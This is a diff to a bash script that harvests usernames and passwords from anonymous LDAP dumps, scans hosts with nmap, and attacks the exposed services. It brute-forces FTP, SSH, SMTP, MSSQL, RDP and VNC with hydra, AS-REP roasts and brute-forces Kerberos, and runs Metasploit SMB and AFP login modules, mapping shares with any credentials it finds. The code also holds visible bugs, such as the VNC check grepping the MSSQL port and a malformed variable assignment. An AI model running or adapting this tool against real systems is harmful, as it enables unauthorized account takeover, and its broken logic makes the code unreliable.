@@ -22,20 +22,44 @@ dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)
 
 if [[ -z "$dump" ]];then
 echo "Empty Dump"
+#timeout 3 python3 getdn.py $line
 echo "======================================="
 continue
 fi
+
+#Grab Users via username
+echo "=========== [Users via username] ==========="
+users=$(echo "$dump" | grep  "\<username: " | cut -d " " -f 2)
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 3
+if [ "$nbusers" -gt 3 ]; then 
+echo "..."
+fi
+echo "$users" > userlist
+
+#Grab Passwds via password
+echo "=========== [Passwds via password] ==========="
+passwds=$(echo "$dump" | grep  "\<password: " | cut -d " " -f 2)
+nbpasswds=$(echo "$passwds" | wc -l )
+echo "$nbpasswds Passwds"
+echo "$passwds" | head -n 3 
+if [ "$nbpasswds" -gt 3 ]; then 
+echo "..."
+fi
+echo "$passwds" > passwdslist
+
 
 #Grab Users via uid
 echo "=========== [Users via uid] ==========="
 users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10 
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3 
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
-echo "$users" > userlist
+echo "$users" >> userlist
 
 
 
@@ -44,8 +68,8 @@ users=$(echo "$dump"  | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cu
 echo "=========== [Users via dn] ==========="
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10 
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3 
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
 echo "$users" >> userlist
@@ -56,8 +80,8 @@ users=$(echo "$dump"  | grep "member: cn=" | cut -d " " -f 2 | cut -d "," -f 1 |
 echo "========= [Users via member] ========="
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
 echo "$users" >> userlist
@@ -69,8 +93,8 @@ users=$(echo "$dump"  | grep "memberUid" | cut -d " " -f 2)
 echo "======= [Users via memberUid] ========"
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10 
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
 echo "$users" >> userlist
@@ -82,8 +106,8 @@ users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
 echo "========= [Users via mail] =========="
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10 
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3 
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
 echo "$users" >> userlist
@@ -94,8 +118,8 @@ mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
 nbmails=$(echo "$mails" | wc -l )
 echo "============== [Mail] ==============="
 echo "$nbmails Mails"
-echo "$mails" | head -n 10 
-if [ "$nbmails" -gt 10 ]; then 
+echo "$mails" | head -n 3 
+if [ "$nbmails" -gt 3 ]; then 
 echo "..."
 fi
 echo "$mails" >> mails
@@ -107,8 +131,8 @@ echo "=========== [Unique users] ==========="
 users=$(cat users)
 nbusers=$(echo "$users" | wc -l )
 echo "$nbusers Users"
-echo "$users" | head -n 10 
-if [ "$nbusers" -gt 10 ]; then 
+echo "$users" | head -n 3 
+if [ "$nbusers" -gt 3 ]; then 
 echo "..."
 fi
 
@@ -118,14 +142,16 @@ fi
 
 if [[ ! -z "$users" ]];then
 echo "=========== [Scan Services] ==========="
-scan_res=$(nmap $line -p 22,25,88,389,445,548,1433,3389)
+scan_res=$(nmap $line -p 21,22,25,88,389,445,548,1433,3389,5900)
 
+ftp_svc=$(echo "$scan_res" | grep "21/tcp   open ")
 ssh_svc=$(echo "$scan_res" | grep "22/tcp   open ")
 smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
 kerb_svc=$(echo "$scan_res" | grep "88/tcp   open")
 #ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
 smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
 afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
+vnc_svc=$(echo "$scan_res" | grep "1433/tcp open")
 mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
 rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 
@@ -140,65 +166,151 @@ rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 #echo "===> LDAP Closed"
 #fi
 
+#FTP
+
+if [[ ! -z "$ftp_svc" ]];then
+
+	echo "===> FTP Open : BF With hydra ftp"
+	echo "$(echo "$users" | wc -l ) Users"
+	if [ "$nbusers" -lt 80 ]; then 
+
+		echo "===> FTP Open : Few Users , Let's go"
+		bash create_user_password_list.sh > userpass
+		hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+		echo ""
+		valid_user_pass_ftp=$(cat valid_user_pass_ftp)
+
+		if [[ ! -z "$valid_user_pass_ftp" ]];then
+			echo "===> FTP Open : Valid User(s) found :"
+			echo "$valid_user_pass_ftp"
+		else 
+			echo "===> FTP Open : No Valid FTP User/Password found"
+		fi
+
+	else
+		echo "===> FTP Open : Lot of users, are you sure (y/*)"
+		read -t 5 ftpbrute
+
+		if [ "$ftpbrute" == "yes" ];then
+			bash create_user_password_list.sh > userpass
+			hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+			$valid_user_pass_ftp=$(cat valid_user_pass_ftp)
+			
+			if [[ ! -z "$valid_user_pass_ftp" ]];then
+				echo "===> FTP Open : Valid User/Password found :"
+				echo "$valid_user_pass_ftp"
+			else 
+				echo "===> FTP Open : No Valid FTP User/Password found"
+			fi
+		else
+			echo "===> FTP Bruteforce Aborted"
+		fi
+	fi
+else 
+	echo "===> FTP Closed"
+fi
+
+
+
 #SSH
 
 if [[ ! -z "$ssh_svc" ]];then
-echo "===> SSH Open : BF With hydra ssh"
-echo "$(echo "$users" | wc -l ) Users"
-if [ "$nbusers" -lt 80 ]; then 
-echo "===> SSH Open : Few Users , Let's go"
-bash create_user_password_list.sh > userpass
-hydra -C userpass -I -t 4 -V $line ssh
-else
-echo "===> SSH Open : Lot of users, are you sure (yes/no)"
-read -t 5 sshbrute
-if [ "$sshbrute" == "yes" ];then
-bash create_user_password_list.sh > userpass
-hydra -C userpass -I -t 4 -V $line ssh
-else
-echo "===> SSH Bruteforce Aborted"
-fi
-fi
+	echo "===> SSH Open : BF With hydra ssh"
+	echo "$(echo "$users" | wc -l ) Users"
+
+
+	if [ "$nbusers" -lt 80 ]; then 
+		echo "===> SSH Open : Few Users , Let's go"
+		bash create_user_password_list.sh > userpass
+		hydra -C userpass -I -t 4 -V $line ssh | grep "login:"  > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+		valid_user_pass_ssh=$(cat valid_user_pass_ssh)
+		if [[ ! -z "$valid_user_pass_ssh" ]];then
+			echo "===> SSH Open : Valid SSH User/Password found"
+			echo "$valid_user_pass_ssh"
+		else 
+			echo "===> SSH Open : No Valid SSH User/Password found"
+		fi
+
+	else
+		echo "===> SSH Open : Lot of users, are you sure (y/*)"
+		read -t 5 sshbrute
+		if [ "$sshbrute" == "y" ];then
+			bash create_user_password_list.sh > userpass
+			hydra -C userpass -I -t 4 -V $line ssh | grep "login:" > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+			valid_user_pass_ssh=$(cat valid_user_pass_ssh)
+			if [[ ! -z "$valid_user_pass_ssh" ]];then
+
+				echo "===> SSH Open : Valid SSH User/Password found"
+				echo "$valid_user_pass_ssh"
+			else 
+				echo "===> SSH Open : No Valid SSH User/Password found"
+			fi
+
+		else
+			echo "===> SSH Bruteforce Aborted"
+		fi
+	fi
 else 
-echo "===> SSH Closed"
+	echo "===> SSH Closed"
 fi
 
-
+#SMTP
 if [[ ! -z "$smtp_svc" ]];then
-if [[ ! -z "$mails" ]];then
-echo "===> SMTP Open and mails dumped : Enum with hydra smtp "
-bash create_mail_password_list.sh > mailpass
-hydra -C mailpass $line smtp -V
-else 
-echo "===> SMTP Open But no mails "
-fi
+	if [[ ! -z "$mails" ]];then
+		echo "===> SMTP Open and mails dumped : Bruteforce with hydra smtp "
+		bash create_mail_password_list.sh > mailpass
+		hydra -C mailpass $line smtp -V
+	else 
+		echo "===> SMTP Open But no mails "
+	fi
 else
-echo "===> SMTP Closed"
+	echo "===> SMTP Closed"
 fi
 
 
-
+#KERBEROS
 if [[ ! -z "$kerb_svc" ]];then
-echo "===> Kerberos Open : Impacket GetNPUsers "
-timeout 60 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users  || echo "I failed, perhaps due to time out"
-echo "===> Kerberos Open : Kerbrute "
-bash create_user_password_list.sh > userpass
-validuserpasskerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
-echo "$validuserpasskerbrute"
-echo "$valid_user_pass_kerbrute" > valid_user_pass_kerbrute
+	echo "===> Kerberos Open : Impacket GetNPUsers "
+	timeout 60 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users  || echo "I failed, perhaps due to time out"
+	echo "===> Kerberos Open : Kerbrute "
+	bash create_user_password_list.sh > userpass
+	valid_user_pass_kerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
+	echo "$valid_user_pass_kerbrute"
+	echo "$valid_user_pass_kerbrute" > valid_user_pass_kerbrute
 else 
-echo "===> Kerberos Closed"
+	echo "===> Kerberos Closed"
 fi
 
-
+#SMB
+#bruteforce
 if [[ ! -z "$smb_svc" ]];then
 echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;"
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+
+valid_user_pass_smb=$(cat valid_user_pass_smb)
+
+
+#map if user found
+if [[ ! -z "$valid_user_pass_smb" ]];then
+
+echo "===> SMB Open : Valid User/Password Found Let's map"
+echo "$valid_user_pass_smb"
+for validuserpass in $(cat valid_user_pass_smb)
+do
+validsmbuser=$(echo $validuserpass | cut -d "\\" -f 2  | cut -d ":" -f 1)
+echo ""
+echo "User: $validsmbuser, Pass: "$validsmbuser""
+smbmap -H $line -u $validsmbuser -p $validsmbuser
+done
+else
+"===> SMB Open : No Valid User/Password Found"
+echo 
+fi
 else 
 echo "===> SMB Closed"
 fi
 
-
+#AFP
 if [[ ! -z "$afp_svc" ]];then
 echo "===> AFP Open : BF With MSF MODULE AFP_Login"
 msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
@@ -206,7 +318,7 @@ else
 echo "===> AFP Closed"
 fi
 
-
+#MSSQL
 if [[ ! -z "$mssql_svc" ]];then
 echo "===> MSSQL Open : BF With Hydra MSSQL"
 bash create_user_password_list.sh > userpass
@@ -215,7 +327,7 @@ else
 echo "===> MSSQL Closed"
 fi
 
-
+#RDP
 if [[ ! -z "$rdp_svc" ]];then
 echo "===> RDP Open : BF With Hydra RDP"
 bash create_user_password_list.sh > userpass
@@ -224,9 +336,31 @@ else
 echo "===> RDP Closed"
 fi
 
+#VNC
+if [[ ! -z "$vnc_svc" ]];then
+echo "===> VNC Open : BF With hydra ftp"
+echo "$(echo "$users" | wc -l ) Users"
+if [ "$nbusers" -lt 80 ]; then 
+echo "===> VNC Open : Few Users , Let's go"
+bash create_user_password_list.sh > userpass
+hydra -C userpass -I -V $line vnc
+else
+echo "===> VNC Open : Lot of users, are you sure (yes/no)"
+read -t 5 vncbrute
+if [ "$vncbrute" == "yes" ];then
+bash create_user_password_list.sh > userpass
+hydra -C userpass -I -V $line vnc
+else
+echo "===> VNC Bruteforce Aborted"
+fi
+fi
+else 
+echo "===> VNC Closed"
+fi
+
 
 #Fast scan if no services found
-if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
+if [[  -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
 echo "============= [Fast Scan] ============="
 timeout 10 nmap $line  -F | grep open || echo "I failed, perhaps due to time out"
 fi
@@ -239,13 +373,8 @@ echo "============= [Full Dump] ============="
 echo "$dump" 
 
 fi
-
-
-
-
 echo "======================================="
 echo ""
 echo ""
 fi
-
 done
